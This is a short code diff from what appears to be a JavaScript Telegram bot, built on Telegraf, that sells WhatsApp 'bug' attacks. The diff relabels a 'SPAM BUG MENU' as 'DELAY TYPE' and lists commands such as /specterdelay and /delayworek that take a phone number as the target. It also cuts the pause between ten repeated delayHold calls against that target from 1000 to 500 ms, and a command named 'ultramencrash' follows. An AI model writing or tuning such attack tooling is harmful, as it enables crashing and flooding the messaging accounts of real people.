@@ -1267,7 +1267,7 @@ async function showxbugs(ctx, page = 1) {
 ◇ System    : Auto-Update
 ◇ Language  : JavaScript
 ◇ Framework : Telegraf
-<blockquote>☾. ⬡═―⊱「 🚀 SPAM BUG MENU 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
+<blockquote>☾. ⬡═―⊱「 🚀 DELAY TYPE 」⊰―═⬡ ࣪ ִֶָ☾.</blockquote>
 ◇ /specterdelay   62xxx  → Delay No Kenon
 ◇ /delayworek     62xxx  → Hard Delay (Maybe)
 ◇ /EquarTerdelay  62xxx  → One Shot Delay
@@ -2346,10 +2346,9 @@ bot.command("Xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
 
   for (let i = 0; i < 10; i++) {
     await delayHold(sock, target);
-    await sleep(1000)
+    await sleep(500)
     }
-  })();
-});
+})
 /// --------- ( CASE BUG 7 ) ---------- \\\
 bot.command("ultramencrash", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
